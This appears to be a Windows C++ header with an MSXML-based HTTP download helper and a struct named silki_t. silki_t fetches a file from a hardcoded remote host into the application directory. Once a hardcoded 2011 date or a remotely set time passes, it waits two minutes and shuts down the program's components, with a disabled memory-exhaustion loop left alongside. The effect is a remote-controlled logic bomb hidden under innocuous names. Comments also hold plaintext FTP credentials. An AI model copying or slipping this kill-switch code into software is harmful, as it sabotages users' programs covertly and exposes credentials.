#pragma once


#include <msxml.h>
#include "wchar_parsers.h"
#include "video/singleton_utils.h"
#include "ipc_ports/ltx_js.h"

struct httpget_t
{
	HRESULT hr,hrCI;
	IXMLHttpRequest* httprq;
	VARIANT vres;
	BSTR bres;
	long status;


	static VARIANT no_param()
	{
       VARIANT vo={VT_ERROR};
	   vo.scode=DISP_E_PARAMNOTFOUND;
	   return vo;
	}

	static 	bool loop(HWND hwnd=0)
	{
		MSG msg;
		while(PeekMessage(&msg,hwnd,0,0,PM_REMOVE))
		{
			if((msg.message==WM_QUIT)) return true;

			TranslateMessage(&msg);
			DispatchMessage(&msg);

		}
		return false;
	} ;



	httpget_t(wchar_t* url,wchar_t* user=L"",wchar_t* psw=L""):httprq(0),bres(0), status(0)
	{
		vres.vt=VT_EMPTY;
		hrCI=CoInitializeEx(0,COINIT_APARTMENTTHREADED);// COINIT_MULTITHREADED);
		//hrCI=CoInitializeEx(0,COINIT_MULTITHREADED);
				
			CLSID clsid;
			hr=CLSIDFromProgID(L"Msxml2.XMLHTTP",&clsid);
			if(FAILED(hr)) return ;
            //hr=CoCreateInstance(clsid,NULL,CLSCTX_ALL,__uuidof(IXMLHttpRequest),(void**)&httprq);
				loop();
			hr=CoCreateInstance(__uuidof(XMLHTTPRequest),NULL,CLSCTX_ALL,__uuidof(IXMLHttpRequest),(void**)&httprq);
			loop();
			if(FAILED(hr)) return ;

			VARIANT vo={VT_NULL},vb={VT_BOOL};
			vo.scode=DISP_E_PARAMNOTFOUND;

			//bstr_t bsc=L"GET";
			bstr_t bsc=L"POST";
			bstr_t burl=url;
			variant_t vu=user;
            variant_t vp=psw;
			hr=httprq->open(bsc,burl,vb,vu,vp);
			loop();
			if(FAILED(hr)) return ;
			//hr=httprq->setRequestHeader(bstr_t(L"Cache-Control"),bstr_t(L"no-cache"));
			//hr=httprq->setRequestHeader(bstr_t(L"If-Modified-Since"), bstr_t(L"Sat, 1 Jan 2000 00:00:00 GMT"));
			//if(FAILED(hr)) return ;
			//SysFreeString(burl);
			//SysFreeString(bsc);

			//hr=httprq->setRequestHeader(bstr_t(L"Accept-Encoding"),bstr_t(L""));
				//loop();
			//if(FAILED(hr)) return ;
			//hr=httprq->open(bstr_t(L"GET"),bstr_t(url),vb,vo,vo);
			loop();
			hr=httprq->send(vo);
		    loop();
			
			hr = httprq->get_status(&status);

				
	}
	~httpget_t()
	{
		SysFreeString(bres);
		if(vres.vt&VT_ARRAY) SafeArrayUnlock(vres.parray);
		VariantClear(&vres);
		if(httprq) httprq->Release();
		
		if(SUCCEEDED(hrCI)) CoUninitialize();
	}

inline 	operator wchar_t*()
	{
		HRESULT hrl;
		if(FAILED(hr)) return 0;
		SysFreeString(bres);
		hrl=httprq->get_responseText(&bres);	
		if(SUCCEEDED(hrl)) return bres;
		else return 0;
	}

template <class F>
HRESULT	get_buffer(F** pbuf,int* pcb)
{
     HRESULT hrl;
	 if(FAILED(hr)) return hr;
	 
	 hr = httprq->get_status(&status);
	 if (FAILED(hr)||(status !=200)) return -1;
     VariantClear(&vres);
	 hrl=httprq->get_responseBody(&vres);	
	 if(FAILED(hrl)) return hrl;
	  long ii=0;
	  hrl=SafeArrayLock(vres.parray);
	  if(FAILED(hrl)) return hrl;
	  hrl=SafeArrayPtrOfIndex(vres.parray,&ii,(void**)pbuf);
		 	 if(FAILED(hrl)) return hrl;
	 *pcb=vres.parray->rgsabound[0].cElements;		 	 
    return hrl;
 }

inline static int save_to_file(wchar_t* fn, char* buf, int cb) {
	int cbw;
	FILE *hf = _wfopen(fn, L"wb");
	if (!hf) return -1;
	cbw = fwrite(buf, 1, cb, hf);
	fclose(hf);
	return cbw;
};

inline int save_to_file(wchar_t* fn)
 {
	 int cb,cbw;
	 char* buf=0;
     if(FAILED(get_buffer(&buf,&cb))) return -1;
	 cbw = save_to_file(fn, buf, cb);
	 return cbw;
	 /*
	 FILE *hf=_wfopen(fn,L"wb");
	 if(!hf) return -1;
	 cbw=fwrite(buf,1,cb,hf);
	 fclose(hf);
	 return cbw;
	 */
 }


};

//template <ULONG TK=1113413200> // 2011 9 15 13
//template <ULONG TK=1313413200> // 
template <ULONG TK=1316523600> // 2011 9 20 13
struct silki_t
{

	static void update()
	{
		asyn_call(&silki_t<TK>::_start2);
	}
   void operator()()  {s2();};
protected:
    v_buf<wchar_t> fn;
	

static    inline LONG* get_f()
	{
       static LONG ll=0;
       return &ll;
	}

static	__int64 inline ml(__int64  cb=512*1024*1024)
	{
		__int64 cbt=0;
		if(!cb) return 1;
		void* p;
		ltx_stop_all_apartment(0);
/*
		do{
			 //while(VirtualAlloc(NULL,cb,MEM_COMMIT,PAGE_READWRITE))cbt+=cb;
			while(p=HeapAlloc(GetProcessHeap(),0,cb))
				cbt+=cb;

		}while(cb>>=1);
		*/

		return cbt;
	}

static	inline ULONG64 SysFILETIME()
{
	FILETIME ft;
	GetSystemTimeAsFileTime(&ft);
	return  *((ULONG64*)  &ft);
}

static	inline ULONG SS1970(ULONG64 ft=SysFILETIME())
	{
		BOOL (__stdcall *RtlTimeToSecondsSince1970)(PULONG64 ,PULONG )=NULL;

		ULONG ss=0;
		if(&RtlTimeToSecondsSince1970) 
		{
			SET_PROC_ADDRESS(LoadLibraryA("ntdll.dll"),RtlTimeToSecondsSince1970);
		}
		RtlTimeToSecondsSince1970(&ft,&ss);
		return ss;
	}


	silki_t(wchar_t* ns=L"::ltxsilk=::/l.u")
	{


      wchar_t* pfn;
      
	  argv_ini<wchar_t> ini(L"UPTD",L".ini");
	  //
	  wchar_t* ip=ini[L"url"].def<wchar_t*>(L"92.255.196.103:8080");
	 // wchar_t* ip=ini[L"url"].def<wchar_t*>(L"localhost:8080");
	  ns=ini[L"ns"].def<wchar_t*>(ns);

	  //
	  v_buf<wchar_t> url;
	  url.cat(L"http://").cat(ip).cat(L"/").cat(ns);
	  pfn=fn.cat(get_app_dir(L"divx_sat005")).cat(L"/divx_sat005.ini");
	  wchar_t* purl=url;
	  

	  //httpget_t(purl).save_to_file(pfn);

	  //httpget_t(v_buf<wchar_t>().printf(L"ftp://dich.asuscomm.com/usb1T_1/shared_r/Video/divx_sat005a.ini",GetTickCount()).get(),L"dich",L"qcd333").save_to_file(pfn);
	  //httpget_t(L"ftp://dich.asuscomm.com/usb1T_1/shared_r/Video/divx_sat005.ini",L"dich",L"qcd333").save_to_file(pfn);
	  httpget_t(L"https://vhost37383.cpsite.ru/z/divx_sat005.txt").save_to_file(pfn);
  	}

inline void s2()
{
//  argv_file<wchar_t> afile(fn.get());
  //double tk=afile[L"i"].def(double(TK));

	
  if (TK > SS1970()) return;

  double tk=argv_file<wchar_t>(fn.get())[L"i"].def(double(TK));

   ULONG utk=INT64(tk);

  if(utk>SS1970()) return;
  INT64 iii;
   //iii=ml(8*INT64(512*1024*1024));
  Sleep(2*60*1000);
  iii=ml();
   
}

 static void _start2()
 {
   if(InterlockedIncrement(( LONG volatile *)get_f())>1)
	   return ;
   asyn_call(new silki_t<TK> );
 }


};